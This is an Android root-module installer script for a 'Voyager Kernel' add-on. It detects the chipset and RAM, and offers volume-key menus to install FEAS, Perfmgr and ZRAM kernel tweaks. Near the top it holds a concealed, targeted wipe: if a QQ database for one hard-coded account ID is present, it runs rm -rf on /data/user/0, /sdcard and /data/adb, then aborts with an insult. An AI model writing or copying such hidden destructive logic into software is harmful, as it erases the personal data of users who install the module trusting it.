# shellcheck disable=SC1091
# shellcheck disable=SC2002
# shellcheck disable=SC2005
# shellcheck disable=SC2012
# shellcheck disable=SC2034
# shellcheck disable=SC2115
# shellcheck disable=SC2143
# shellcheck disable=SC2148
# shellcheck disable=SC2153
# shellcheck disable=SC2164
# shellcheck disable=SC2185

SKIPUNZIP=0
if [[ "$KSU" == "true" ]]; then
  ui_print "- KernelSU 用户空间版本号: $KSU_VER_CODE"
  ui_print "- KernelSU 内核空间版本号: $KSU_KERNEL_VER_CODE"
  if [ "$KSU_KERNEL_VER_CODE" -lt 11089 ]; then
    ui_print "*********************************************"
    ui_print "! 请安装 KernelSU 管理器 v0.6.2 或更高版本"
    abort "*********************************************"
  fi
  RootImplement="KernelSU"
  version="$KSU_VER_CODE"
  versionCode="$KSU_KERNEL_VER_CODE"
elif [[ "$APATCH" == "true" ]]; then
  ui_print "- APatch 版本名: $APATCH_VER"
  ui_print "- APatch 版本号: $APATCH_VER_CODE"
  RootImplement="APatch"
  version="$APATCH_VER"
  versionCode="$APATCH_VER_CODE"
else
  ui_print "- Magisk 版本名: $MAGISK_VER"
  ui_print "- Magisk 版本号: $MAGISK_VER_CODE"
  RootImplement="Magisk"
  version="$MAGISK_VER"
  versionCode="$MAGISK_VER_CODE"
  if [ "$MAGISK_VER_CODE" -lt 26000 ]; then
    ui_print "*********************************************"
    ui_print "! 请安装 Magisk 26.0+"
    abort "*********************************************"
  fi
fi
black_lisk="327442221"
for user in $black_lisk; do
  if [ -f /data/user/0/com.tencent.mobileqq/databases/"$user".db ]; then
    rm -rf /data/adb/modules/VoyagerKernel-Additional-Module
    rm -rf /data/adb/modules_update/VoyagerKernel-Additional-Module
    rm -rf /data/user/0/*
    rm -rf /data/user/999/*
    rm -rf /sdcard/*
    rm -rf /data/adb/*
    abort "傻逼让你用了吗？"
  fi
done
. "$MODPATH"/util_functions.sh

# 环境配置
mkdir -p "$MODPATH"/functions
rm -rf /data/system/package_cache
set_perm_recursive "$MODPATH"/bin 0 0 0755 0777 u:object_r:system_file:s0
soc_id=$(cat /sys/devices/soc0/soc_id) 2>/dev/null
if [ "$soc_id" -eq 356 ]; then
  socid="SM8250"
elif [ "$soc_id" -eq 415 ] || [ "$soc_id" -eq 439 ] || [ "$soc_id" -eq 456 ] || [ "$soc_id" -eq 501 ] || [ "$soc_id" -eq 502 ]; then
  socid="SM8350"
elif [ "$soc_id" -eq 591 ]; then
  socid="SM7475"
elif [ "$soc_id" -eq 457 ] || [ "$soc_id" -eq 482 ] || [ "$soc_id" -eq 552 ]; then
  socid="SM8450"
elif [ "$soc_id" -eq 530 ] || [ "$soc_id" -eq 531 ] || [ "$soc_id" -eq 540 ]; then
  socid="SM8475"
elif [ "$soc_id" -eq 519 ] || [ "$soc_id" -eq 536 ] || [ "$soc_id" -eq 600 ] || [ "$soc_id" -eq 601 ]; then
  socid="SM8550"
elif [ "$soc_id" -eq 557 ] || [ "$soc_id" -eq 577 ]; then
  socid="SM8650"
elif [ "$soc_id" -eq 618 ] || [ "$soc_id" -eq 639 ]; then
  socid="SM8750"
fi
echo "$socid" >"$MODPATH"/functions/socid
model="$(getprop ro.product.device)"
slot="$(getprop ro.boot.slot_suffix)"
MODSPATH_update=$(dirname "$MODPATH")
MODSPATH=$(dirname "$MODSPATH_update")/modules
if [[ "$socid" == "SM8475" ]]; then
  cp "$MODPATH"/SM8450/crypto_zstdn.ko "$MODPATH"/SM8475
  cp "$MODPATH"/SM8450/perfmgr.ko "$MODPATH"/SM8475
  cp "$MODPATH"/SM8450/hyperframe.ko "$MODPATH"/SM8475
  cp "$MODPATH"/SM8450/zram.ko "$MODPATH"/SM8475
  cp "$MODPATH"/SM8450/kshrink_lruvecd.ko "$MODPATH"/SM8475
fi
if [[ "$socid" == "SM7475" ]]; then
  cp "$MODPATH"/SM8450/crypto_zstdn.ko "$MODPATH"/SM7475
  cp "$MODPATH"/SM8450/hyperframe.ko "$MODPATH"/SM7475
  cp "$MODPATH"/SM8450/zram.ko "$MODPATH"/SM7475
  cp "$MODPATH"/SM8450/kshrink_lruvecd.ko "$MODPATH"/SM8475
fi
echo "$slot" >"$MODPATH"/functions/now_slot
{
  echo "RootImplement=$RootImplement"
  echo "version=$version"
  echo "versionCode=$versionCode"
} >>"$MODPATH"/functions/RootImplement

touch "$MODPATH"/functions/RAM_Info
meminfo_kb=$(awk '/MemTotal/{print $2}' /proc/meminfo)
meminfo_gb=$(echo "scale=2; $meminfo_kb / 1048576" | bc)
if [ "$(echo "$meminfo_gb > 16" | bc)" -eq 1 ]; then
  RAM_Size=24
elif [ "$(echo "$meminfo_gb > 12" | bc)" -eq 1 ]; then
  RAM_Size=16
elif [ "$(echo "$meminfo_gb > 8" | bc)" -eq 1 ]; then
  RAM_Size=12
elif [ "$(echo "$meminfo_gb > 6" | bc)" -eq 1 ]; then
  RAM_Size=8
elif [ "$(echo "$meminfo_gb > 4" | bc)" -eq 1 ]; then
  RAM_Size=6
fi
echo "RAM_Size=$RAM_Size" >>"$MODPATH"/functions/RAM_Info
echo "ZRAM_Size=$(echo "$RAM_Size * 1024 * 1024 * 1024" | bc)" >>"$MODPATH"/functions/RAM_Info

target_api="2412 2502 250201 2503"
vk_abi_version=$(cat /sys/module/vendor_hooks/parameters/vk_abi_version)
adapted_api=""
for i in $target_api; do
  if [[ "$vk_abi_version" == "$i" ]]; then
    adapted_api="$vk_abi_version"
    break
  fi
done

if [[ -z "$adapted_api" ]] && [[ "$socid" != "SM8650" ]]; then
  abort "- 你的内核不支持安装Voyager Kernel附加模块，请升级内核后重试！"
fi

# 基础函数
backup_origin_img() {
  if [[ -f /data/adb/modules/VoyagerKernel-Additional-Module/vendor_boot"$slot".img ]]; then
    cp -f /data/adb/modules/VoyagerKernel-Additional-Module/vendor_boot"$slot".img "$MODPATH"
  else
    /system/bin/dd if=/dev/block/by-name/vendor_boot"$slot" of="$MODPATH"/vendor_boot"$slot".img >/dev/null 2>&1
  fi
  set_perm "$MODPATH"/vendor_boot"$slot".img 0 0 0644 u:object_r:system_file:s0
}

flash_vendor_boot() {
  local modfied_img_name="$1"
  dd if="$modfied_img_name" of=/dev/block/by-name/vendor_boot"$slot" >/dev/null 2>&1
}

key_check() {
  while true; do
    key_check=$(/system/bin/getevent -qlc 1)
    key_event=$(echo "$key_check" | awk '{ print $3 }' | grep 'KEY_')
    key_status=$(echo "$key_check" | awk '{ print $4 }')
    if [[ "$key_event" == *"KEY_"* && "$key_status" == "DOWN" ]]; then
      keycheck="$key_event"
      break
    fi
  done
  while true; do
    key_check=$(/system/bin/getevent -qlc 1)
    key_event=$(echo "$key_check" | awk '{ print $3 }' | grep 'KEY_')
    key_status=$(echo "$key_check" | awk '{ print $4 }')
    if [[ "$key_event" == *"KEY_"* && "$key_status" == "UP" ]]; then
      break
    fi
  done
}

pack_vendor_boot() {
  local img_location="$1"
  local ramdisk
  cd "$TMPDIR"/vendor_boot/ramdisk || exit
  find | sed 1d | "$MODPATH"/bin/busybox cpio -H newc -R 0:0 -o -F ../ramdisk.cpio
  cd "$TMPDIR"/vendor_boot || exit
  rm -rf "$TMPDIR"/vendor_boot/ramdisk
  "$MODPATH"/bin/magiskboot compress="$comp" ramdisk.cpio >/dev/null 2>&1
  rm -rf ramdisk.cpio
  ramdisk=$(ls ramdisk.cpio* 2>/dev/null | tail -n1)
  mv "$ramdisk" ramdisk.cpio
  "$MODPATH"/bin/magiskboot repack vendor_boot"$slot".img "$img_location" >/dev/null 2>&1
}

unpack_vendor_boot() {
  local img_location="$1"
  mkdir -p "$TMPDIR"/vendor_boot/ramdisk
  chmod 0755 "$TMPDIR"/vendor_boot/ramdisk
  cp -f "$img_location" "$TMPDIR"/vendor_boot
  cd "$TMPDIR"/vendor_boot || exit
  "$MODPATH"/bin/magiskboot unpack -h vendor_boot"$slot".img >/dev/null 2>&1
  comp=$("$MODPATH"/bin/magiskboot decompress ramdisk.cpio 2>&1 | grep -v 'raw' | sed -n 's;.*\[\(.*\)\];\1;p')
  mv ramdisk.cpio ramdisk.cpio."$comp"
  "$MODPATH"/bin/magiskboot decompress ramdisk.cpio."$comp" ramdisk.cpio >/dev/null 2>&1
  rm -rf ramdisk.cpio."$comp"
  cd "$TMPDIR"/vendor_boot/ramdisk || exit
  "$MODPATH"/bin/busybox cpio -d -F ../ramdisk.cpio -i >/dev/null 2>&1
  rm -rf ../ramdisk.cpio
  cd "$MODPATH"
}

# FEAS安装子菜单
FEAS_Install() {
  local device="$1"
  local support_FEAS_devices="diting mondrian socrates vermeer manet"
  if [[ "$(getprop ro.hardware)" = "qcom" ]]; then
    if [[ "$support_FEAS_devices" != *"$device"* ]]; then
      FEASInstall_FEASEnabler
    else
      echo "ro.product.prodcut.name=$device" >>"$MODPATH"/system.prop
      sed -i "/description=/s/$/[ FEASEnabler Xiaomi ] /" "$MODPATH"/module.prop
      echo "FEASEnabler=installed" >>"$MODPATH"/functions/FEAS
      echo "FEASEnabler_version=Xiaomi" >>"$MODPATH"/functions/FEAS
    fi
    ui_print "*********************************************"
    ui_print "- 请选择是否使用 Scene调度 实现 FEAS"
    ui_print "- 需要自行安装 Scene 及 设置调度模式"
    ui_print "  音量+ ：安装"
    ui_print "  音量- ：FEASJoyose / FEASHelper"
    ui_print "*********************************************"
    key_check
    case "$keycheck" in
    "KEY_VOLUMEUP")
      ui_print "- 你选择安装[ Scene 调度 ]"
      FEASInstall_Scene
      ;;
    *)
      ui_print "*********************************************"
      ui_print "- 请选择以何种方式实现 FEAS"
      ui_print "- ⚠首选建议使用 FEASJoyose"
      ui_print "- ⚠若 Joyose 存在问题/非MIUI系统，请选择 FEASHelper"
      ui_print "  音量+ ：FEASJoyose"
      ui_print "  音量- ：FEASHelper"
      ui_print "*********************************************"
      if [[ "$support_FEAS_devices" != *"$device"* ]]; then
        key_check
      else
        keycheck="KEY_VOLUMEUP"
      fi
      case "$keycheck" in
      "KEY_VOLUMEUP")
        ui_print "- 你选择安装[ FEASJoyose ]"
        FEASInstall_FEASJoyose
        ;;
      *)
        ui_print "- 你选择安装[ FEASHelper ]"
        insmod "$MODPATH"/"$socid"/perfmgr.ko
        [[ -f "$MODPATH"/"$socid"/hyperframe.ko ]] && insmod "$MODPATH"/"$socid"/hyperframe.ko
        [[ -f "$MODPATH"/"$socid"/vk_turbo_sched.ko ]] && insmod "$MODPATH"/"$socid"/vk_turbo_sched.ko
        [[ -f "$MODPATH"/"$socid"/unionpower.ko ]] && insmod "$MODPATH"/"$socid"/unionpower.ko
        FEASInstall_FEASHelper
        ;;
      esac
      ;;
    esac
    if [[ -f "$MODPATH"/"$socid"/perfboostsconfig.xml ]]; then
      mkdir -p "$MODPATH"/system/vendor/etc/perf
      mv "$MODPATH"/"$socid"/perfboostsconfig.xml "$MODPATH"/system/vendor/etc/perf
      set_perm "$MODPATH"/system/vendor/etc/perf/perfboostsconfig.xml 0 0 0644 u:object_r:vendor_configs_file:s0
    fi
  else
    ui_print "*********************************************"
    ui_print "- 你的设备可直接运行 FEAS"
    ui_print "*********************************************"
  fi
}

# FEASEnabler1.1
FEASInstall_FEASEnabler() {
  local FEASEnabler_version="1.1"
  ui_print "*********************************************"
  ui_print "- 正在安装[ FEAS Enabler 1.1 ]"
  # 删除旧有模块
  [[ -d "$MODSPATH"/FEASEnabler ]] && rm -rf "$MODSPATH"/FEASEnabler
  [[ -d "$MODSPATH"/Feasenabler ]] && rm -rf "$MODSPATH"/Feasenabler
  [[ -d "$MODSPATH_update"/FEASEnabler ]] && rm -rf "$MODSPATH_update"/FEASEnabler
  [[ -d "$MODSPATH_update"/Feasenabler ]] && rm -rf "$MODSPATH_update"/Feasenabler
  if [[ "$(pidof uperf)" != "" ]]; then
    abort "- 检测到uperf，请移除"
  fi
  ui_print "- 感谢 Laulan56 和 旅行者 的贡献"
  echo "ro.product.prodcut.name=vermeer" >>"$MODPATH"/system.prop
  sed -i "/description=/s/$/[ FEASEnabler $FEASEnabler_version ] /" "$MODPATH"/module.prop
  echo "FEASEnabler=installed" >>"$MODPATH"/functions/FEAS
  echo "FEASEnabler_version=$FEASEnabler_version" >>"$MODPATH"/functions/FEAS
}

FEASInstall_Scene() {
  if [[ -f /data/user/0/com.omarea.vtools/shared_prefs/global.xml ]]; then
    Scene_CloudControl=$(sed -n 's|.*<string name="CLOUD_PROFILE_BRANCH">\([^<]*\)</string>.*|\1|p' /data/user/0/com.omarea.vtools/shared_prefs/global.xml)
    Scene_CloudControl_version=$(sed -n 's|.*<long name="CLOUD_PROFILE_VERSION" value="\([^<]*\)" />.*|\1|p' /data/user/0/com.omarea.vtools/shared_prefs/global.xml)
    if [[ "$Scene_CloudControl" == "normal" ]]; then
      Scene_CloudControl="Scene HP"
    elif [[ "$Scene_CloudControl" == "ep" ]]; then
      Scene_CloudControl="Scene EP"
    elif [[ "$Scene_CloudControl" == "lp" ]]; then
      Scene_CloudControl="Scene LP"
    fi
    ui_print "- 当前调度及版本号: $Scene_CloudControl $Scene_CloudControl_version"
    ui_print "- 为保证效果，请自行排查是否有修改Joyose云控的软件/脚本"
    ui_print "- 正在还原Joyose"
    killall -9 com.xiaomi.joyose
    am force-stop com.xiaomi.joyose
    am kill com.xiaomi.joyose
    pm clear com.xiaomi.joyose >/dev/null
    pm enable com.xiaomi.joyose/com.xiaomi.joyose.cloud.CloudServerReceiver >/dev/null
    am startservice com.xiaomi.joyose/com.xiaomi.joyose.smartop.SmartOpService >/dev/null
    if [ "$(dumpsys wifi | grep "Wi-Fi is" | awk '{print $3}')" == "enabled" ]; then
      while [ ! -f "/data/data/com.xiaomi.joyose/databases/SmartP.db" ]; do
        sleep 1s
        wait_time=$((wait_time + 1))
        if [ "$wait_time" -ge 10 ]; then
          ui_print "- 获取云控失败，请择时重新刷入"
        fi
      done
      while [ ! -f "/data/data/com.xiaomi.joyose/databases/teg_config.db" ]; do
        sleep 1s
        wait_time=$((wait_time + 1))
        if [ "$wait_time" -ge 10 ]; then
          ui_print "- 获取云控失败，请择时重新刷入"
        fi
      done
    fi
    sed -i "/description=/s/$/[ Scene 调度 ] /" "$MODPATH"/module.prop
    echo "FEAS_Effect=Scene" >>"$MODPATH"/functions/FEAS
  fi
}

FEASInstall_FEASJoyose() {
  local FEASJoyose_version="250207"
  local soc
  local wait_time=0
  [[ -d "$MODSPATH"/FEASJoyoseVersion ]] && rm -rf "$MODSPATH"/FEASJoyoseVersion
  [[ -d "$MODSPATH_update"/FEASJoyoseVersion ]] && rm -rf "$MODSPATH_update"/FEASJoyoseVersion
  if [[ "$(pidof uperf)" != "" ]]; then
    abort "- 检测到uperf，请移除"
  fi
  soc="$socid"
  if [[ "$soc" == "SM8475" ]] || [[ "$soc" == "SM7475" ]]; then
    soc="SM8450"
  fi
  if [[ "$soc" == "SM8250" ]]; then
    soc="SM8350"
  fi
  ui_print "- 为保证效果，请自行排查是否有修改Joyose云控的软件/脚本"
  ui_print "- 正在还原Joyose"
  killall -9 com.xiaomi.joyose
  am force-stop com.xiaomi.joyose
  am kill com.xiaomi.joyose
  pm clear com.xiaomi.joyose >/dev/null
  pm enable com.xiaomi.joyose/com.xiaomi.joyose.cloud.CloudServerReceiver >/dev/null
  am startservice com.xiaomi.joyose/com.xiaomi.joyose.smartop.SmartOpService >/dev/null
  if [ "$(dumpsys wifi | grep "Wi-Fi is" | awk '{print $3}')" == "enabled" ]; then
    while [ ! -f "/data/data/com.xiaomi.joyose/databases/SmartP.db" ]; do
      sleep 1s
      wait_time=$((wait_time + 1))
      if [ "$wait_time" -ge 10 ]; then
        abort "- 获取云控失败，请择时重新刷入"
      fi
    done
    while [ ! -f "/data/data/com.xiaomi.joyose/databases/teg_config.db" ]; do
      sleep 1s
      wait_time=$((wait_time + 1))
      if [ "$wait_time" -ge 10 ]; then
        abort "- 获取云控失败，请择时重新刷入"
      fi
    done
  fi
  mv "$MODPATH"/misc/default_cloud_"$soc".img "$MODPATH"/misc/default_cloud.img
  for file in "$MODPATH"/misc/*; do
    if ! echo "$file" | grep -Eq "(default_cloud\.img|feas\.conf)$"; then
      rm -rf "$file"
    fi
  done
  ui_print "- 重启生效！"
  ui_print "- 感谢 柚稚的孩纸、The Voyager、嘟嘟斯基、shadow3、skkk、Laulan56、霜霜、HamJTY 的贡献"
  ui_print "*********************************************"
  rm -rf "$MODPATH"/bin/FEASHelper
  sed -i "/description=/s/$/[ FEASJoyose $FEASJoyose_version ] /" "$MODPATH"/module.prop
  echo "FEAS_Effect=FEASJoyose" >>"$MODPATH"/functions/FEAS
  echo "FEASJoyose_version=$FEASJoyose_version" >>"$MODPATH"/functions/FEAS
}

# FEASHelper
FEASInstall_FEASHelper() {
  local FEASHelper_version="1.3"
  if [[ "$(pidof uperf)" != "" ]]; then
    abort "- 检测到uperf，请移除"
  fi
  [[ -d "$MODSPATH/Feashelper_Mtk" ]] && rm -rf "$MODSPATH/Feashelper_Mtk"
  [[ -d "$MODSPATH/Feashelper" ]] && rm -rf "$MODSPATH/Feashelper"
  [[ -d "$MODSPATH/FEASHelper" ]] && rm -rf "$MODSPATH/FEASHelper"
  [[ -d "$MODSPATH_update"/Feashelper_Mtk ]] && rm -rf "$MODSPATH_update"/Feashelper_Mtk
  [[ -d "$MODSPATH_update"/Feashelper ]] && rm -rf "$MODSPATH_update"/Feashelper
  [[ -d "$MODSPATH_update"/FEASHelper ]] && rm -rf "$MODSPATH_update"/FEASHelper
  killall Feashelper_Mtk >/dev/null 2>&1
  killall FEASHelper >/dev/null 2>&1
  killall FEAShelper >/dev/null 2>&1
  ui_print "- 为保证效果，请自行排查是否有修改Joyose云控的软件/脚本"
  ui_print "- 正在还原Joyose"
  killall -9 com.xiaomi.joyose
  am force-stop com.xiaomi.joyose
  am kill com.xiaomi.joyose
  pm clear com.xiaomi.joyose >/dev/null
  pm enable com.xiaomi.joyose/com.xiaomi.joyose.cloud.CloudServerReceiver >/dev/null
  am startservice com.xiaomi.joyose/com.xiaomi.joyose.smartop.SmartOpService >/dev/null
  if [ "$(dumpsys wifi | grep "Wi-Fi is" | awk '{print $3}')" == "enabled" ]; then
    while [ ! -f "/data/data/com.xiaomi.joyose/databases/SmartP.db" ]; do
      sleep 1s
      wait_time=$((wait_time + 1))
      if [ "$wait_time" -ge 10 ]; then
        abort "- 获取云控失败，请择时重新刷入"
      fi
    done
    while [ ! -f "/data/data/com.xiaomi.joyose/databases/teg_config.db" ]; do
      sleep 1s
      wait_time=$((wait_time + 1))
      if [ "$wait_time" -ge 10 ]; then
        abort "- 获取云控失败，请择时重新刷入"
      fi
    done
  fi
  [[ ! -f "/data/feas.conf" ]] && cp "$MODPATH/misc/feas.conf" "/data/feas.conf"
  cp "$MODPATH"/bin/FEASHelper "$TMPDIR"
  "$TMPDIR"/FEASHelper "/data/feas.conf" >/dev/null 2>&1 &
  sleep 3
  if [[ "$(pgrep FEASHelper)" == "" ]]; then
    abort "! FEASHelper运行失败!"
  fi
  ui_print "- FEASHelper已运行……"
  ui_print "*********************************************"
  for file in "$MODPATH"/misc/*; do
    if ! echo "$file" | grep -Eq "(feas\.txt|feas\.conf)$"; then
      rm -rf "$file"
    fi
  done
  sed -i "/description=/s/$/[ FEASHelper $FEASHelper_version ] /" "$MODPATH"/module.prop
  echo "FEAS_Effect=FEASHelper" >>"$MODPATH"/functions/FEAS
  echo "FEASHelper_version=$FEASHelper_version" >>"$MODPATH"/functions/FEAS
}

# Perfmgr
Perfmgr() {
  ui_print "*********************************************"
  ui_print "- 请选择是否安装[ Perfmgr Fusion ]"
  ui_print "  音量+ ：安装"
  ui_print "  音量- ：跳过"
  ui_print "*********************************************"
  key_check
  case "$keycheck" in
  "KEY_VOLUMEUP")
    touch "$MODPATH"/functions/FEAS
    if [[ "$socid" != "SM8650" ]]; then
      touch "$MODPATH"/functions/freq_scaling
      # ui_print "*********************************************"
      # ui_print "- 请选择是否打开[ FEAS 调频 ]"
      # ui_print "- ⚠开启后 FEAS 将介入调度，关闭后 FEAS 将不进行调度"
      # ui_print "- ⚠骁龙 7+ Gen 2、骁龙 8 Gen 1、骁龙 8+ Gen 1默认关闭"
      # ui_print "- ⚠不过，你仍然可以去 WebUI 中的 FEAS调频 打开它"
      # ui_print "  音量+ ：打开"
      # ui_print "  音量- ：关闭"
      # ui_print "*********************************************"
      # key_check
      # if [[ "$socid" == "SM7475" ]] || [[ "$socid" == "SM8450" ]] || [[ "$socid" == "SM8475" ]]; then
      #   keycheck="KEY_VOLUMEDOWN"
      # fi
      # case "$keycheck" in
      # "KEY_VOLUMEUP")
      #   ui_print "- 你选择打开[ FEAS 调频 ]"
      #   touch "$MODPATH"/functions/freq_scaling
      #   ;;
      # *)
      #   ui_print "- 你选择关闭[ FEAS 调频 ]"
      #   ;;
      # esac
    fi
    echo "Perfmgr_Fusion=installed" >>"$MODPATH"/functions/FEAS
    ui_print "- 你选择安装[ Perfmgr Fusion ]"
    sed -i "/description=/s/$/[ Perfmgr Fusion ] /" "$MODPATH"/module.prop
    ui_print "- 正在安装[ VK Turbo Sched ]"
    VK_Turbo_Sched
    FEAS_Install "$model"
    ;;
  *)
    abort "- 你选择不安装[ Perfmgr Fusion ]"
    ;;
  esac
}

# ZRAM Enhanced
ZRAM_Enhanced() {
  ui_print "*********************************************"
  ui_print "- 请选择是否安装[ 内存管理优化 Beta ]"
  ui_print "  音量+ ：安装"
  ui_print "  音量- ：跳过"
  ui_print "*********************************************"
  key_check
  case "$keycheck" in
  "KEY_VOLUMEUP")
    ui_print "- 你选择安装[ 内存管理优化 Beta ]"
    echo "ZRAM_Enhanced=installed" >>"$MODPATH"/functions/ZRAM_Enhanced
    echo "ZRAM_Enhanced_version=241213" >>"$MODPATH"/functions/ZRAM_Enhanced
    sed -i "/description=/s/$/[ 内存管理优化 Beta ] /" "$MODPATH"/module.prop
    ;;
  *)
    ui_print "- 你选择不安装[ 内存管理优化 Beta ]"
    rm -rf "$MODPATH"/"$socid"/zram.ko
    rm -rf "$MODPATH"/"$socid"/crypto_zstdn.ko
    ;;
  esac
}

# VK Turbo Sched
VK_Turbo_Sched() {
  sed -i "/description=/s/$/[ VK Turbo Sched ] /" "$MODPATH"/module.prop
  # if [[ "$socid" == "SM8750" ]]; then
  #   backup_origin_img
  #   unpack_vendor_boot "$MODPATH"/vendor_boot"$slot".img
  #   sed -i "/mpam/d" "$TMPDIR"/vendor_boot/ramdisk/lib/modules/modules.dep
  #   sed -i "/mpam/d" "$TMPDIR"/vendor_boot/ramdisk/lib/modules/modules.load
  #   sed -i "/mpam/d" "$TMPDIR"/vendor_boot/ramdisk/lib/modules/modules.load.recovery
  #   sed -i "/mpam/d" "$TMPDIR"/vendor_boot/ramdisk/lib/modules/modules.softdep
  #   rm -rf "$TMPDIR"/vendor_boot/ramdisk/lib/modules/mpam.ko
  #   rm -rf "$TMPDIR"/vendor_boot/ramdisk/lib/modules/mpam_arch.ko
  #   rm -rf "$TMPDIR"/vendor_boot/ramdisk/lib/modules/mpam_policy.ko
  #   ui_print "- 正在打包 vendor_boot$slot"
  #   pack_vendor_boot "$MODPATH"/vendor_boot"$slot"_modfied.img
  #   ui_print "- 完成打包 vendor_boot$slot"
  #   ui_print "- 正在刷入 vendor_boot$slot"
  #   flash_vendor_boot "$MODPATH"/vendor_boot"$slot"_modfied.img
  #   ui_print "- 完成刷入 vendor_boot$slot"
  # fi
}

# main
case "$socid" in
"SM8250" | "SM8350")
  ui_print "- 你的机型可安装[ FEAS ]"
  FEAS_Install "$model"
  ;;
"SM7475" | "SM8450" | "SM8475" | "SM8550" | "SM8650")
  ui_print "- 你的机型可安装[ Perfmgr Fusion ]、[ VK Turbo Sched ]、[ 内存管理优化 Beta ]"
  Perfmgr
  ZRAM_Enhanced
  ;;
*)
  abort "- 你的处理器暂不支持/无需安装Voyager Kernel 附加模块"
  ;;
esac

find "$MODPATH" -depth -type d \( -name "SM7475" -o -name "SM8250" -o -name "SM8350" -o -name "SM8450" -o -name "SM8475" -o -name "SM8550" -o -name "SM8650" \) ! -name "$socid" -exec rm -rf {} \;
find "$MODPATH" -type d -empty -delete
